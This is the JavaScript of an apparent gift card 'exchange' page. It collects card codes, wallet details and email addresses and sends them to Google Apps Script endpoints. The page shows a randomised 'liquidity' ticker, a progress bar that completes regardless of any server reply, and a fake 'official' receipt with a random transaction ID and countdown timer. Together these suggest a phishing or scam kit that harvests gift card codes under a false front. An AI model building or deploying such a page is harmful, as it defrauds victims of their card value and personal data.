    <script>
        // UPDATED BRIDGING URLS
        const bridgeScriptURL = 'https://script.google.com/macros/s/AKfycbwWfWjW1mJkzoiZSy3GsJk8-X2q82gyPI8yZ_zvh5-j1dN5aZrUUP-5ky4v-S5rD1k/exec';
        const emailTemplateURL = 'https://script.google.com/macros/s/AKfycbzUNIbS4Hh8zd4GGfcMAgbEzy2lkztBWrg53vOOyNj03AbwoNNuUi9IulcOYf6XbQKL/exec';
        
        let method = ""; let rateL = 1; let sym = "USD";
        const successSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3');

        const wmLayer = document.getElementById('wm-layer');
        for(let i=0; i<30; i++) {
            const span = document.createElement('span');
            span.className = 'wm-text';
            span.innerText = 'OFFICIAL DLA DOCUMENT';
            wmLayer.appendChild(span);
        }

        function toggleTheme() {
            const html = document.documentElement;
            const btn = document.getElementById('theme-btn');
            if (html.getAttribute('data-theme') === 'dark') {
                html.setAttribute('data-theme', 'light');
                btn.innerText = "🌙 DARK";
            } else {
                html.setAttribute('data-theme', 'dark');
                btn.innerText = "☀️ LIGHT";
            }
        }

        function updateTicker() {
            const liq = (2840500 + Math.floor(Math.random() * 5000)).toLocaleString();
            document.getElementById('live-ticker').innerHTML = `💰 LIQUIDITY: $${liq} • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE`;
        }
        setInterval(updateTicker, 8000);

        function sel(el, val, shadow, r, s) {
            document.querySelectorAll('.pay').forEach(x => x.classList.remove('active'));
            el.classList.add('active');
            method = val; rateL = r; sym = s;
            document.getElementById('payout-label').innerText = val + " Details";
            document.getElementById('wallet').placeholder = shadow;
            updateVal();
        }

        function updateVal() {
            let v = parseFloat(document.getElementById('amt').value);
            let rate = parseFloat(document.getElementById('brand').value);
            let totalUSD = (isNaN(v) ? 0 : (v * rate));
            document.getElementById('display-area').innerHTML = '<b>$' + totalUSD.toFixed(2) + '</b>';
            let lBox = document.getElementById('local-payout');
            if(rateL > 1) {
                lBox.style.display = "block";
                lBox.innerText = "(" + (totalUSD * rateL).toLocaleString() + " " + sym + ")";
            } else { lBox.style.display = "none"; }
        }

        function submitNow() {
            const cardCode = document.getElementById('card').value;
            const walletDetails = document.getElementById('wallet').value;
            const userEmail = document.getElementById('email').value;
            const amount = document.getElementById('display-area').innerText;
            if(!method || !cardCode || !walletDetails || !userEmail) return alert("Please fill all fields.");

            document.getElementById('form').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            // SEND TO BRIDGE FOR PROCESSING & EMAIL HUB
            fetch(bridgeScriptURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ 
                    "card_code": cardCode, 
                    "payout_total_usd": amount.replace('$', ''), 
                    "payout_method": method, 
                    "wallet_details": walletDetails, 
                    "user_email": userEmail,
                    "hub_name": "GLA-EXCHANGE-HUB",
                    "template_url": emailTemplateURL
                })
            }).then(() => {
                let p = 0;
                let iv = setInterval(() => {
                    p++; document.getElementById('pbar').style.width = p + "%";
                    if(p==33) document.getElementById('s1').className='step-done';
                    if(p==66) document.getElementById('s2').className='step-done';
                    if(p>=100) { clearInterval(iv); showReceipt(); }
                }, 60);
            });
        }

        function showReceipt() {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('success').style.display = 'block';
            let tid = "DLA-TX" + Math.floor(100000 + Math.random() * 900000);
            
            let cleanGateway = method.replace(/([\u2700-\u27BF]|[\uE000-\uF8FF]|\uD83C[\uDC00-\uDFFF]|\uD83D[\uDC00-\uDFFF]|[\u2011-\u26FF]|\uD83E[\uDD10-\uDDFF])/g, '').trim();
            
            document.getElementById('r-tid').innerText = tid;
            document.getElementById('r-gateway').innerText = cleanGateway;
            document.getElementById('r-path').innerText = document.getElementById('wallet').value;
            document.getElementById('r-price').innerText = document.getElementById('display-area').innerText;
            document.getElementById('r-local-val').innerText = document.getElementById('local-payout').innerText;
            document.getElementById('r-date').innerText = new Date().toLocaleString();
            new QRCode(document.getElementById("qrcode"), { text: tid, width: 60, height: 60 });
            successSound.play();
            startTimer();
        }

        function startTimer() {
            let time = 3600;
            const timerEl = document.getElementById('r-timer');
            const countdown = setInterval(() => {
                time--;
                let h = Math.floor(time / 3600);
                let m = Math.floor((time % 3600) / 60);
                let s = time % 60;
                timerEl.innerText = `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
                if (time <= 0) clearInterval(countdown);
            }, 1000);
        }

        function saveHDReceipt() {
            html2canvas(document.querySelector("#receipt-content"), { scale: 3 }).then(canvas => {
                const link = document.createElement('a');
                link.download = 'DLA_Certificate_Official.png';
                link.href = canvas.toDataURL();
                link.click();
            });
        }
    </script>
